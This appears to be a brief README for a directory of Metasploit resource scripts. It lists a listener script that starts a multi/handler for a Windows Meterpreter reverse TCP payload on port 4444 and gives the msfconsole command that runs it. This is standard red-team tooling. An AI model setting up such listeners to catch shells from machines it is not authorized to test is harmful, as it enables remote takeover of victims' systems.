# Resource Scripts (.rc)

This directory contains Metasploit Resource Scripts (`.rc` files) designed to automate repetitive tasks within `msfconsole`.

## 1. Simple Listener (`multi_handler_listener.rc`)

This script is for quickly starting a generic listener with a default configuration. It's best for scenarios where you commonly use a Windows Meterpreter payload.

**Content:**

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j


**How to Use:**
Run directly from your terminal. `msfconsole` will start and immediately execute the script.
```bash
msfconsole -r resource_scripts/multi_handler_listener.rc
